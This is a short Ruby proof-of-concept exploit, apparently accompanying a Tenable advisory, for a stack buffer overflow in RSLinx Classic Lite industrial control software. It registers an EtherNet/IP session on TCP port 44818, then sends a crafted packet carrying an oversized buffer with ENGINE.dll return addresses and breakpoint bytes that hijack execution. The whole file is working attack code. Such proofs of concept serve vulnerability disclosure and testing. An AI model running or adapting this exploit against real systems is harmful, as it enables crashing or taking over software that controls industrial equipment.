#!/usr/bin/env ruby 
# tested against RSLinx Classic Lite 2.58.00 15 CPR 9 SR 4
# https://www.tenable.com/security/research/tra-2018-26

require 'rex'

host = ARGV[0]

nop = [0x67edfdac].pack('V') * 8 # ENGINE.dll
psh = [0x67ea9cd6].pack('V')     # ENGINE.dll
ints = "\xcc" * 12

buff = Rex::Text.pattern_create(600) 
buff[158, 4] = [0x67ec39bd].pack('V') # ENGINE.dll
buff[162, nop.size + psh.size + ints.size] = nop + psh + ints.force_encoding("ASCII-8BIT")

begin

sock = Rex::Socket::Tcp.create('PeerHost'  => host, 
                               'PeerPort'  => 44818)

req =  "\x65\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
req << "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"

sock.write(req)
res = sock.get_once()
x = res[4]

req1 =  "\x6f\x00\x3b\x01#{x}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
req1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00"
req1 << "\x00\x00\x00\x00\xb2\x00\x2b\x01\x54\x02\x20\x06\x24\x01\x00\xf9"
req1 << "\x31\x00\x00\x80\x30\x00\xfe\x80\x37\x13\x34\x12\xaa\xbb\xcc\xdd"
req1 << "\x00\x00\x00\x00\x00\x12\x7a\x00\x01\x00\x00\x12\x7a\x00\x01\x00"
req1 << "\xa3\xff\x10\xff" + buff.force_encoding("UTF-8")

sock.write(req1)
res = sock.get_once()

rescue => e
puts "#{e.to_s}"
end
